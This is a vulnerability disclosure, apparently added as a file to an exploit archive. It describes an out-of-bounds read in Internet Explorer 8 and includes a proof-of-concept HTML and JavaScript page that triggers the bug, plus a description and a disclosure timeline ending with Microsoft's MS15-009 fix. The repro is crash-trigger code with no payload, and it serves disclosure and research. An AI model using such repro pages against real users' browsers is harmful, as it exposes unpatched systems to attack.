@@ -1,0 +1,69 @@
+<!--
+Source: http://blog.skylined.nl/20161122001.html
+
+Synopsis
+
+A specially crafted web-page can cause Microsoft Internet Explorer 8 to attempt to read data beyond the boundaries of a memory allocation. The issue does not appear to be easily exploitable.
+
+Known affected software, attack vectors and mitigations
+
+Microsoft Internet Explorer 8
+
+An attacker would need to get a target user to open a specially crafted web-page. Disabling Javascript should prevent an attacker from triggering the vulnerable code path.
+
+Repro.html:
+-->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+  <style>
+    position_­fixed {  position: fixed; }
+    position_­relative { position: relative;  }
+    float_­left { float: left; }
+    complex { float: left; width: 100%; }
+    complex:first-line { clear: left; }
+  </style>
+  <script>
+    window.onload = function boom() {
+      o­Element_­float_­left = document.create­Element('float_­left');
+      o­Element_­complex = document.create­Element('complex');
+      o­Element_­position_­fixed = document.create­Element('position_­fixed');
+      o­Element_­position_­relative = document.create­Element('position_­relative');
+      o­Element_­table = document.create­Element('table');
+      o­Element_­x = document.create­Element('x');
+      o­Text­Node = document.create­Text­Node('x');
+      document.document­Element.append­Child(o­Element_­float_­left);
+      o­Element_­float_­left.append­Child(o­Element_­complex);
+      o­Element_­float_­left.append­Child(o­Text­Node);
+      o­Element_­complex.append­Child(o­Element_­position_­fixed);
+      o­Element_­complex.append­Child(o­Element_­position_­relative);
+      o­Element_­complex.append­Child(o­Element_­table);
+      o­Element_­complex.append­Child(o­Element_­x);
+      set­Timeout(function() {
+        o­Element_­x.set­Attribute('class', 'x');
+        set­Timeout(function() {
+          alert();
+          document.write(0);
+        }, 0);
+      }, 0);
+    }
+  </script>
+  </head>
+</html>
+
+<!--
+Description
+
+The issue requires rather complex manipulation of the DOM and results in reading a value immediately following an object. The lower three bits of this value are returned by the function doing the reading, resulting in a return value in the range 0-7. After exhaustively skipping over the read AV and having that function return each value, no other side effects were noticed. For that reason I assume this issue is hard if not impossible to exploit and did not investigate further. It is still possible that there may be subtle effects that I did not notice that allow exploitation in some form or other.
+
+Time-line
+
+June 2014: This vulnerability was found through fuzzing.
+October 2014: This vulnerability was submitted to ZDI.
+October 2014: This vulnerability was rejected by ZDI.
+November 2014: This vulnerability was reported to MSRC.
+February 2015: This vulnerability was addressed by Microsoft in MS15-009.
+November 2016: Details of this issue are released.
+-->
